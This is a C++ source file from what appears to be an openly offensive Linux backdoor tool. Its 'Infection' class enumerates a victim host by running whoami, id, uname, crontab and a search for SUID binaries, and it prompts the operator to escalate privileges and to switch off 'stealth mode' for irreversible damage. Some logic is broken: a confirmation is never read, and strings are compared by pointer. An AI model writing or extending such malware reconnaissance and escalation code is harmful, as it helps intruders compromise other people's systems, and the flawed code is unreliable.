#include "Infection.h"

FileInformations Infection::GetFileInformations(const char* fileName){
	struct stat fileMetaInformations;
	FileInformations infos;
	printf("[+] File Informations : %s\n", fileName);
	if(stat(fileName, &fileMetaInformations) < 0){
		return infos;
	}
	//File Name
	infos.fileName = fileName;
	printf("FileName = %s\n", fileName);
	//File Permissions
	infos.filePermissions[0] = ((S_ISDIR(fileMetaInformations.st_mode) ? 'd' : '-'));
	infos.filePermissions[1] = ((fileMetaInformations.st_mode & S_IRUSR) ? 'r' : '-');
	infos.filePermissions[2] = ((fileMetaInformations.st_mode & S_IWUSR) ? 'w' : '-');
	infos.filePermissions[3] = ((fileMetaInformations.st_mode & S_IXUSR) ? 'x' : '-');
	infos.filePermissions[4] = ((fileMetaInformations.st_mode & S_IRGRP) ? 'r' : '-');
	infos.filePermissions[5] = ((fileMetaInformations.st_mode & S_IWGRP) ? 'w' : '-');
	infos.filePermissions[6] = ((fileMetaInformations.st_mode & S_IXGRP) ? 'x' : '-');
	infos.filePermissions[7] = ((fileMetaInformations.st_mode & S_IROTH) ? 'r' : '-');
	infos.filePermissions[8] = ((fileMetaInformations.st_mode & S_IWOTH) ? 'w' : '-');
	infos.filePermissions[9] = ((fileMetaInformations.st_mode & S_IXOTH) ? 'x' : '-');
	infos.filePermissions[10] = ' ';
	//File Other Informations
	infos.fileSize = fileMetaInformations.st_size;
	infos.fileLinks = fileMetaInformations.st_nlink;
	infos.fileiNode = fileMetaInformations.st_ino;
	//Print Fields
	printf("%d\n%d\n%d\n", infos.fileSize, infos.fileLinks, infos.fileiNode);
	return infos;	
}
void Infection::askForPrivilegeEscalation(){
	std::string answer2PE = {""};
	while(true){
		printf("[+] Would you like to try to escalate your privileges?\n");
		printf("Please use the following format for your answer (y/Y/yes/YES | n/N/no/NO) : ");
		std::cin >> answer2PE;
		if(answer2PE == "YES" || answer2PE == "NO" || answer2PE == "Y" || answer2PE == "N" || answer2PE == "yes" || answer2PE == "no" || answer2PE == "y" || answer2PE == "n"){
			if(answer2PE == "YES" || answer2PE == "yes" || answer2PE == "y" || answer2PE == "Y"){
				printf("[+] Attempting to find Privilege Escalation Vectors and Potentially Exploit it !\n");
				tryPrivilegeEscalation = true;
				break;
			} else if(answer2PE == "NO" || answer2PE == "no" || answer2PE == "n" || answer2PE == "N"){
				printf("[+] Skipping the search for Privilation Escalation Vectors !\n");
				//tryPrivilegeEscalation  = false;
				printf("[+] Break");
				break;
			}
		} else {
			printf("[-] Please enter a valid value !\n");
			system("sleep 2.5");
			system("clear");
		}
	}	
}

bool Infection::askForNoStealthMode(){
	std::string answer2StealthMode{""};
	while(true){
		printf("[+] Would you like to disable Stealth Mode and really F#!$ your target system ?");
		printf("Please use the following format for your answer (y/Y/yes/YES | n/N/no/NO) : ");
		std::cin >> answer2StealthMode;
		if(answer2StealthMode == "YES" || answer2StealthMode == "NO" || answer2StealthMode == "Y" || answer2StealthMode == "N" || answer2StealthMode == "yes" || answer2StealthMode == "no" || answer2StealthMode == "y" || answer2StealthMode == "n"){
			if(answer2StealthMode == "YES" || answer2StealthMode == "yes" || answer2StealthMode == "y" || answer2StealthMode == "Y"){
				std::string confirm{""};
				printf("[+] Stealth Mode Disabled, the system is going to be fucked !\n");
				printf("Are you sure you want to continue ? (The damage caused by the malware are not reversable) : ");
				if(confirm == "YES" || confirm == "yes" || confirm == "y" || confirm == "Y"){
					return stealthEnabled = false;
				}					
			}		
		} else if(answer2StealthMode == "NO" || answer2StealthMode == "no" || answer2StealthMode == "n" || answer2StealthMode == "N"){
			printf("[+] Stealth Mode Enabled, *shhhhhh*");
			return stealthEnabled = true;
		}
	}
}

void Infection::runLocalCommand(const char* commandToRun, const char* errorMESSAGE){
	char buffer[2055];
	FILE *command = popen(commandToRun, "r");
	if(command == NULL){
		printf("%s", errorMESSAGE);
	}
	//Print the command
	while(fgets(buffer, sizeof(buffer), command) != NULL){
		printf("%s\n", buffer);
	}
}

void Infection::runLocalCommand(const char* commandToRun, const char* errorMESSAGE, const char* successMessage){
	char buffer[2055];
	FILE *command = popen(commandToRun, "r");
	if(command == NULL){
		printf(errorMESSAGE);
	}
	//Print the command
	while(fgets(buffer, sizeof(buffer), command) != NULL){
		printf("%s %s", successMessage,buffer);
	}
}

void Infection::runLocalCommand(const char* commandToRun, const char* errorMESSAGE, const char* successMessage, const char* vOutput){
	char buffer[2055];
	FILE *command = popen(commandToRun, "r");
	if(command == NULL){
		printf(errorMESSAGE);
	}

	//Print the command
	while(fgets(buffer, sizeof(buffer), command) != NULL){
		if(vOutput == "KernelRelease"){
			if(buffer != ""){
				KernelRelease = buffer;
				printf("%s %s", successMessage, buffer);
			}
		} else if(vOutput == "KernelVersion"){
			if(buffer != ""){
				KernelVersion = buffer;
				printf("%s %s", successMessage, buffer);
			}
		} else if(vOutput == "suidFiles") {
			if(buffer != ""){
				printf("\t- %s", buffer);
			}
		} else if(vOutput == "whoami"){
			if(buffer != ""){
				user = buffer;
				printf("%s %s", successMessage, buffer);
			}
		}else if(vOutput == "findApache"){
			if(buffer != ""){
				printf("[+] Found Package : %s", buffer);
				isApache2Present = true;
			} else {
				printf("[-] Apache not found on the system !");
				isApache2Present = false;
			}
		} else if(vOutput == "localeLanguage"){
			localLanguage = buffer;
			printf("%s %s", successMessage, buffer);
		} else if(vOutput == "timezone"){
			localTimeZone = buffer;
			printf("%s %s", successMessage, buffer);
		} else {
			printf("%s %s", successMessage, buffer);
		}
	}
}

void Infection::GetLinuxVersion(){
	//Get the version of the linux target
	//Current User
	const char* currentUserErrorMessage = "[-] Failed to obtain the current user name";
	const char* currentUserSuccessMessage = "[+] Current User :";
	runLocalCommand("whoami", currentUserErrorMessage, currentUserSuccessMessage, "whoami");
	//User and group informations
	const char* currentUserGroupErrorMessage = "[-] Failed to obtain the user and group information";
	const char* currentUserGroupSuccessMessage = "[+] User and Group Informations :";
	runLocalCommand("id", currentUserGroupErrorMessage, currentUserGroupSuccessMessage, "id");
	//Kernel Release
	const char* kernelReleaseErrorMessage = "[-] Failed to obtain Kernel Release";
	const char* kernelReleaseSuccessMessage = "[+] Kernel Release :";
	runLocalCommand("uname -r", kernelReleaseErrorMessage, kernelReleaseSuccessMessage, "KernelRelease");
	//Locale Language on the system
	const char* localLangErrorMessage = "[+] Can't retrieve System Local Language";
	const char* localLangSuccessMessage = "[+] System Local Language :";
	runLocalCommand("localectl | grep System | cut -d ' ' -f6 | cut -d '=' -f2", localLangErrorMessage, localLangSuccessMessage, "localeLanguage");
	const char* timeZoneErrorMessage = "[+] Can't retrieve Timezone";
	const char* timeZoneSuccessMessage = "[+] Timezone :";
	runLocalCommand("cat /etc/timezone", timeZoneErrorMessage, timeZoneSuccessMessage, "timezone");
	//KernelVersion [Kind of useless right now]
	//const char* kernelFullErrorMessage = "[-] Failed to obtain Kernel Version";
	//const char* kernelFullSuccessMessage = "[+] Kernel Version :";
	//runLocalCommand("uname -v", kernelFullErrorMessage, kernelFullSuccessMessage, "KernelVersion");
	//Distribution Release Number
	const char* distributionReleaseNumberErrorMessage = "[-] Failed to obtain Kernel Distribution Number";
	const char* distributionReleaseNumberSuccessMessage = "[+] Kernel Release Number :";
	runLocalCommand("lsb_release -r -s", distributionReleaseNumberErrorMessage, distributionReleaseNumberSuccessMessage, "KernelVersion");
	//APACHE2 Detection
	const char* apacheDetectionErrorMessage = "[-] Couldn't search apache2";
	const char* apacheDetectionSuccessMessage = "[+] Apache2 Found on the victim system !";
	runLocalCommand("dpkg --get-selections | grep apache2 | cut -d '	' -f1", apacheDetectionErrorMessage, apacheDetectionSuccessMessage, "findApache");
	//Cron jobs
	printf("[+] Cron Jobs :\n");
	const char* cronJobsErrorMessage = "[-] Failed to obtain the Cron Jobs";
	const char* cronJobsSuccessMessage = "[+] Cron Jobs successfully retrieved !";
	runLocalCommand("crontab -l", cronJobsErrorMessage, cronJobsSuccessMessage);
	//SUID Files
	const char* suidFilesErrorMessage = "[-] Failed to obtain SUID Files";
	const char* suidFilesSuccessMessage = "[+] SUID Files :";
	if(tryPrivilegeEscalation){
		printf("[+] SUID Files :\n");
		runLocalCommand("find / -type f -perm -u=s 2>/dev/null", suidFilesErrorMessage, suidFilesSuccessMessage, "suidFiles");
	}
}

bool Infection::startInfection(){
	//GetLinuxVersion
	FileInformations passwd;
	passwd = Infection::GetFileInformations("LinuxBackdoorer");
	if(std::experimental::filesystem::exists("logs.txt")){
		Infection::log2File("logs.txt", *user + " added content to log file.");
	} else {
		Infection::log2File("logs.txt", *user + " created log file.");
	}
	Infection::write2File("TEST.txt", "I am making tests BOW !");
	Infection::askForPrivilegeEscalation();
	printf("[+] Get Linux Version");
	Infection::GetLinuxVersion();
	Networking::enumerateAdapters();
	return true;

}
